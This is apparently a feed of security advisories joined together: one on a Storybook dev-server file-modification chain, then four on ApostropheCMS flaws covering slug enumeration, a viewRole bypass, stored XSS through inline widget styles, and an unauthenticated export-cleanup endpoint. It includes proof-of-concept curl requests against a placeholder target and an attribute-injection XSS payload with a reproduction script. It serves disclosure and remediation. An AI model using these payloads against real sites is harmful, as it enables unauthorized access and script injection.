Summary: A malicious website may be able to cause unauthorized file changes in a developer’s project while an affected Storybook development server is running. Under additional conditions, a changed file could be executed by a local runtime with the developer’s privileges. We are not aware of exploitation in the wild.

Who is impacted?

You are impacted if you run a Storybook dev server in the affected versions.

You are not impacted if:

  • You run a dev server that you never open in a web browser (e.g. headless automation, MCP clients)
  • You run or visit a built version of Storybook

Recent versions of Chrome and Firefox may ask for permission before a website can connect to a localhost service. This reduces the risk, but does not remove it. Do not grant this permission to websites you don’t trust.

Recommended actions

Upgrade Storybook

Storybook has released patched versions of all affected major Storybook versions that fix all the vulnerabilities necessary for the worst-case scenario above to occur.

Upgrade to a patched version listed below before running storybook dev again. If you cannot upgrade immediately, do not run an affected Storybook dev server until you can apply the fix.

  • 11.0.0-alpha.6
  • 10.6.2
  • 9.1.21
  • 8.6.19

Review potentially breaking changes

Due to the exceptional nature of the reported vulnerabilities, the Storybook team has decided to change the default behavior of Storybook, including versions 8 and 9, for several network-related features that are not essential to most Storybook users' workflow. If your team relies on the affected features, we've added feature flags that can disable specific security updates to support your existing workflows.

Please carefully read the introduced flags and the consequences of using them.

Iframe embedding over the network is disabled by default

Storybook no longer allows the manager or preview to be embedded as an iframe on a website with a different host name. Built versions of Storybook are unaffected and can be freely embedded.

If you rely on embedding a Storybook dev server through a separate web app, run that separate app on localhost. You may also use the security.insecureRemoteIframeEmbed feature flag to re-enable iframe embedding from any origin.

The preview iframe rejects messages sent by an unknown host

Both the Storybook preview and manager now restrict the origin of iframes and parent windows that they can send messages to and receive messages from using the postMessage API.

By default, Storybook in dev mode only accepts communication with its own origin and other localhost services. Built Storybooks continue to accept communication from unknown origins.

A Storybook addon or integration could hypothetically rely on postMessage to update a live story's args. If you do that, reach out to the Storybook team to explore safer alternatives.

Storybook composition also relies on postMessage, so a composed Storybook on a different origin now fails to load unless it has been built. The security.insecureIframeMessaging feature flag disables this protection, but we recommend you build composed Storybooks instead.

The highlight event signature has changed

Storybook’s own accessibility addon uses the highlight event to inject highlights into the preview, which a user can click. Clicking the highlight opens a menu with a link to a documentation page.

The API for that event was too permissive and could be used to trigger arbitrary events, including events processed by the user’s dev server. We reworked the API to prevent abuse. Besides the accessibility addon, Chromatic's Visual Tests addon uses this API to link to documentation from highlighted ignored elements. Update the Visual Tests addon to version 5.5.1 or later to keep that link working. Because no other addons use this API as far as we know, we have not added a feature flag to restore the old API.

Disclosure timeline

On September 30th, the Storybook team received a responsible disclosure showing how a malicious website can embed a Storybook dev server's preview iframe and send events to the dev server on the developer's machine.

They combined this information with findings from an ongoing security audit to come up with a worst-case-scenario exploitation of the disclosed vulnerability, and the ones we independently discovered. They then worked to address all layers necessary for this worst-case scenario to happen. We have not received evidence of exploitation in real Storybook projects. The attack outlined in this advisory relies on correctly exploiting a sequence of many vulnerabilities, some of which were never disclosed to the Storybook team.

Worst-case attack scenario

An attacker-controlled website can interact with the preview of a running Storybook dev server. With user interaction, it may cause the dev server to make unauthorized changes to story files. If a malicious file is subsequently executed by a local runtime, the attack could lead to arbitrary code execution with the developer’s permissions.

items.content_html:
Summary: A malicious website may be able to cause unauthorized file changes in a developer’s project while an affected Storybook development server is running. You are impacted if you run a Storybook dev server in the affected versions.

You are not impacted if:

  • You run a dev server that you never open in a web browser (e.g. headless automation, MCP clients)
  • You run or visit a built version of Storybook

Recent versions of Chrome and Firefox may ask for permission before a website can connect to a localhost service. This reduces the risk, but does not remove it. Do not grant this permission to websites you don’t trust.

Upgrade Storybook

Storybook has released patched versions of all affected major Storybook versions that fix all the vulnerabilities necessary for the worst-case scenario above to occur.

Upgrade to a patched version listed below before running storybook dev again. If you cannot upgrade immediately, do not run an affected Storybook dev server until you can apply the fix.

  • 11.0.0-alpha.6
  • 10.6.2
  • 9.1.21
  • 8.6.19

Due to the exceptional nature of the reported vulnerabilities, the Storybook team has decided to change the default behavior of Storybook, including versions 8 and 9, for several network-related features that are not essential to most Storybook users' workflow. If your team relies on the affected features, we've added feature flags that can disable specific security updates to support your existing workflows.

Please carefully read the introduced flags and the consequences of using them.

Storybook no longer allows the manager or preview to be embedded as an iframe on a website with a different host name. Built versions of Storybook are unaffected and can be freely embedded.

Summary

The slugTaken endpoint returns a boolean indicating whether a slug is in use across all document types and visibility levels, with no permission or type filter. Any logged-in user (including editors) can enumerate the slug space of private pages, drafts, and archived content.

Details

POST /api/v1/@apostrophecms/doc/slugTaken with body { "slug": "target-slug" } runs a raw existence check against the documents collection. It does not:

  • Check whether the requesting user has read permission for documents of that type.
  • Filter by visibility (public, loginRequired, private).
  • Filter by viewRole.
  • Filter by publication status (draft vs published).

A single authenticated session can iterate the slug space to enumerate the full content inventory of the CMS, including content the user is explicitly prohibited from viewing.

PoC

# Any authenticated session works — editor role sufficient
curl -b "$EDITOR_JAR" -X POST \
  -H "Content-Type: application/json" \
  -d '{"slug":"known-private-page-slug"}' \
  "http://TARGET/api/v1/@apostrophecms/doc/slugTaken"
# → { "taken": true }  — confirms private page exists

curl -b "$EDITOR_JAR" -X POST \
  -H "Content-Type: application/json" \
  -d '{"slug":"zzz-nonexistent"}' \
  "http://TARGET/api/v1/@apostrophecms/doc/slugTaken"
# → { "taken": false }

Impact

Information disclosure. An attacker with any authenticated session can enumerate all slugs in the system, mapping the full content structure of the CMS including private and admin-only content.

items.content_html:
Summary

The getOne REST endpoint for pages does not apply viewRole type-level restrictions or viewPermission field-level redaction. An editor-level user who knows a document _id can read the full content of admin-only pages and their privileged fields, while the getAll endpoint correctly enforces both restrictions.

Details

Finding 3 — viewRole bypass: modules/@apostrophecms/page/index.js exposes getRestQuery(req, omitPermissionCheck = false). The getAll path calls publicApiCheckAsync and threads the full query builder pipeline including viewRole filtering. The getOne path uses a divergent code path that skips this pipeline.

A page type declared with viewRole: 'admin' is inaccessible via GET /api/v1/@apostrophecms/page?type=secretPage (returns 403 to an editor) but is fully returned by GET /api/v1/@apostrophecms/page/:id:en:published to the same editor.

Finding 4 — viewPermission field leak: Fields decorated with viewPermission: { action: 'edit', type: '@apostrophecms/page' } are stripped by removeForbiddenFields in the getAll path but are returned verbatim in getOne. An editor who knows any document _id can read all viewPermission-restricted fields.

PoC

# Log in as editor, get session jar
EDITOR_JAR="..."

# getAll — correctly blocked
curl -b "$EDITOR_JAR" \
  "http://TARGET/api/v1/@apostrophecms/page?type=secretPage"
# → 403 Forbidden

# getOne — bypassed, returns full document including viewPermission fields
curl -b "$EDITOR_JAR" \
  "http://TARGET/api/v1/@apostrophecms/page/ADMIN_PAGE_ID:en:published"
# → 200 OK, full doc including secretField value

Impact

Editors can read the full content of any page — including those restricted to admins via viewRole — if they know or can guess the _id. Sensitive field values gated by viewPermission are also fully exposed. This breaks the content access control model for any site using these decorators.

items.content_html:
Summary

ApostropheCMS widget styles support project-defined schema fields. If a project defines a free-form string style field with a CSS property and no selector, an editor-controlled value is rendered as an inline CSS declaration. The resulting declaration is then inserted into the widget wrapper's style="..." attribute without HTML-attribute escaping.

An attacker who can edit the widget can include a double quote in the style value, terminate the style attribute, and inject new HTML event-handler attributes. The payload is stored with the widget and executes in the Apostrophe site origin whenever the affected published page is rendered.

This is a sibling of CVE-2026-33889 / GHSA-97v6-998m-fp4g. The earlier issue escaped from a <style> element through a malicious color value. This variant reaches a different sink related to the automatically generated widget wrapper's inline style and class attributes.

Details

Root Cause 1: Free-form string style values retain HTML metacharacters

The standard string field converter uses launder.string() and length validation. This performs type normalization, not output encoding for an HTML attribute context:

packages/apostrophe/modules/@apostrophecms/schema/lib/addFieldTypes.js:296-333

self.addFieldType({
  name: 'string',
  // ...
  convert(req, field, data, destination) {
    destination[field.name] = self.apos.launder.string(data[field.name]);
    destination[field.name] = checkStringLength(
      destination[field.name],
      field.min,
      field.max
    );
  }
});

Quotes therefore remain in a value supplied through a style field.

Root Cause 2: The value is converted into inline CSS without value validation

For a field with property but no selector or media query, renderScopedStyles() selects inline rendering. The generic extractor concatenates the configured property and editor-controlled value:

packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs:171-228

packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs:598-647

rule = `${property}: ${normalized.value}${normalized.unit}`;

// ...

if (isInline) {
  return {
    css: '',
    classes: [ ...storage.classes ],
    inline: stringifyRules(storage.styles, true)
  };
}

For example, the value below becomes part of a font-family declaration:

serif" tabindex="0" autofocus onfocus="document.body.dataset.inline='executed'

Root Cause 3: Attribute values are serialized without HTML escaping

getWidgetAttributes() places the inline CSS into an attribute tuple, then concatenates every tuple into key="value" without encoding &, <, >, ', or ":

packages/apostrophe/modules/@apostrophecms/styles/lib/methods.js:251-322

if (styleParts.length) {
  attrs.push(
    [ 'style', `${styleParts.join(';')};` ]
  );
}

if (options.asObject) {
  return Object.fromEntries(attrs);
}

return attrs
  .map(([ key, value ]) => `${key}="${value}"`)
  .join(' ');

The same raw serializer also makes a project-defined free-form string style with class: true a potential sibling path, because the string is added to classes and later serialized into class="...". The inline-property path was the path dynamically verified.

Root Cause 4: The unsafe string is used by the automatic public wrapper

Styled widgets use getWidgetAttributes() to create a wrapper around the rendered widget:

packages/apostrophe/modules/@apostrophecms/widget-type/index.js:448-457

if (hasStyles && self.options.stylesWrapper !== false) {
  const styles = self.apos.styles.prepareWidgetStyles(widget);
  const styleTag = self.apos.styles
    .getWidgetElements(styles, { scene: req.scene });
  const wrapperAttrs = self.apos.styles.getWidgetAttributes(styles);

  return `${styleTag}<div${wrapperAttrs ? ' ' + wrapperAttrs : ''}>${markup}</div>`;
}

Consequently, the injected attribute is present on normal public page renders, not only in the editor UI.

Why the CVE-2026-33889 defense does not prevent this variant

The sibling advisory led to a defense in getWidgetElements() that rewrites </ before CSS is inserted into a <style> element:

css = css.replaceAll('</', '<\\/');

This protects the style-element boundary. The vulnerable path above produces inline output instead of css, so it never reaches that replacement.

Affected Configurations and Versions

The verified configuration has all of the following properties:

  • A widget defines a style field with a free-form type such as string.
  • The field uses property without a selector, causing inline-style rendering, or uses class: true with an unrestricted string value.
  • The attacker has permission to edit a widget containing the field.
  • The malicious content is published, or a higher-privileged user views the affected draft.

Standard range, select, and color presets do not directly provide an unrestricted quote-containing value and were not demonstrated as affected by this variant.

Proof of Concept

Step 1: Configure a widget with a free-form inline style

Add a style field similar to the following to a widget module:

module.exports = {
  extend: '@apostrophecms/widget-type',
  options: {
    label: 'Style Attribute Test'
  },
  styles: {
    add: {
      customFont: {
        type: 'string',
        label: 'Custom Font',
        property: 'font-family'
      }
    }
  }
};

The absence of selector makes the generated declaration inline.

Step 2: Store the payload

As a user who may edit this widget, enter the following value in customFont and save the widget:

serif" tabindex="0" autofocus onfocus="document.body.dataset.inline='executed'

Publish the page, or have another user view the affected draft.

Step 3: Reproduce the renderer output directly

The vulnerable data flow can also be reproduced using the real renderer and serializer from a checked-out, dependency-installed repository:

const methodsFactory = require(
  './packages/apostrophe/modules/@apostrophecms/styles/lib/methods.js'
);

(async () => {
  const { renderScopedStyles } = await import(
    './packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs'
  );

  const payload =
    'serif" tabindex="0" autofocus ' +
    'onfocus="document.body.dataset.inline=\'executed\'';

  const styles = renderScopedStyles(
    [ {
      name: 'customFont',
      type: 'string',
      property: 'font-family'
    } ],
    { customFont: payload }
  );

  Object.assign(styles, {
    styleId: 'audit-inline',
    widgetId: 'widget-1'
  });

  const attrs = methodsFactory({}, {}).getWidgetAttributes(styles);
  console.log('inline:', styles.inline);
  console.log('attributes:', attrs);
})();

Step 4: Observe the unsafe HTML

The current renderer produced:

inline: font-family: serif" tabindex="0" autofocus onfocus="document.body.dataset.inline='executed';

The serializer then produced an attribute string equivalent to:

id="audit-inline"
data-apos-widget-style-wrapper-for="widget-1"
data-apos-widget-style-classes=""
style="font-family: serif" tabindex="0" autofocus
onfocus="document.body.dataset.inline='executed';"

The attacker-controlled quote terminates the style attribute. tabindex, autofocus, and onfocus become separate live attributes.

Step 5: Confirm execution in a browser

When the generated wrapper was loaded in Chrome 153, autofocus triggered the injected handler automatically. The DOM changed to:

<body data-inline="executed">
  <div id="audit-inline" tabindex="0" autofocus="" onfocus="..."></div>
</body>

The safe behavior would be for the quote to appear as " inside the style attribute, with no injected attributes and no change to document.body.dataset.

Impact

  • Stored XSS on published pages: JavaScript executes for unauthenticated visitors who load a page containing the affected widget.
  • Privilege escalation: If an administrator or another privileged editor views the page or draft, the payload executes with that user's application-origin privileges and can perform authenticated actions available to the victim.
  • Persistent content manipulation: The payload is stored with widget content and continues to execute until the style value is removed or the output path is fixed.
  • Phishing and data access: The script can alter the rendered page, read non-HttpOnly same-origin data, and issue same-origin requests as the victim.

Recommended Fix

Fix 1: HTML-escape every string-returning attribute value

The string branch of getWidgetAttributes() should encode values for a double-quoted HTML attribute context before concatenation. At minimum, encode &, <, >, ", and ' using a centralized Apostrophe HTML encoder.

Conceptually:

if (options.asObject) {
  return Object.fromEntries(attrs);
}

return attrs
  .map(([ key, value ]) => {
    return `${key}="${escapeHtmlAttribute(String(value))}"`;
  })
  .join(' ');

The structured asObject branch should remain structured so that its eventual template/DOM renderer can perform context-appropriate encoding.

Fix 2: Validate style values by their destination grammar

Output encoding is the primary fix. As defense in depth:

  • Require select/range/color or another constrained type for common CSS properties.
  • Parse and validate free-form CSS property values instead of treating them as arbitrary strings.
  • For class: true, accept only individual valid class-name tokens rather than an unrestricted string.

items.content_html:
1. Summary

The API endpoint POST /api/v1/@apostrophecms/import-export/clean-export in @apostrophecms/import-export lacks authentication and authorization checks. Any client—including unauthenticated anonymous users who have obtained the standard CSRF cookie from visiting the site—can directly invoke this route and trigger the underlying self.cleanExport(req) method.

2. Affected Files & Endpoints

  • Endpoint: POST /api/v1/@apostrophecms/import-export/clean-export
  • Route Definition: packages/import-export/lib/apiRoutes.js (lines 32–34)
  • Method Implementation: packages/import-export/lib/methods/import.js (lines 1271–1324)

3. Root Cause Analysis

In packages/import-export/lib/apiRoutes.js, the get.related handler explicitly validates that the caller is logged in:

get: {
  async related(req) {
    if (!req.user) {
      throw self.apos.error('forbidden');
    }
    // ...
  }
}

In contrast, post.cleanExport (as well as post.overrideDuplicates) lacks any verification of req.user:

post: {
  async overrideDuplicates(req) {
    return self.overrideDuplicates(req);
  },

  async cleanExport(req) {
    return self.cleanExport(req); // <-- No authentication check
  }
}

Because ApostropheCMS does not enforce authentication globally on all apiRoutes, omitting an explicit if (!req.user) guard allows anonymous requests to pass directly through to the business logic layer.

4. Evidence

When sending an unauthenticated POST request with the site’s CSRF cookie (issued to any visitor on GET /), the request bypasses access control entirely and executes self.cleanExport(req), as demonstrated by the server stack trace:

at Object.cleanExport (.../packages/import-export/lib/methods/import.js)
at .../packages/apostrophe/modules/@apostrophecms/module/index.js:193:30

This confirms that execution directly reaches the core import-export handler without an authenticated session.

5. Impact

  1. Broken Access Control: Unauthenticated users can invoke cleanup operations and delete temporary export files and artifacts stored on the server.
  2. Unauthorized State Mutation: The endpoint allows modifying job records in the database via req.body.jobId (forcing them to ended: true, status: 'completed') and dismissing notifications via req.body.notificationId without verifying whether the resources belong to the requesting caller.

6. Suggested Remediation (Patch)

Enforce an authentication check in packages/import-export/lib/apiRoutes.js before executing the underlying methods:

--- a/packages/import-export/lib/apiRoutes.js
+++ b/packages/import-export/lib/apiRoutes.js
@@ -26,10 +26,16 @@ module.exports = self => {
     get: { ... },
     post: {
       async overrideDuplicates(req) {
+        if (!req.user) {
+          throw self.apos.error('forbidden');
+        }
         return self.overrideDuplicates(req);
       },
 
       async cleanExport(req) {
+        if (!req.user) {
+          throw self.apos.error('forbidden');
+        }
         return self.cleanExport(req);
       }
     }
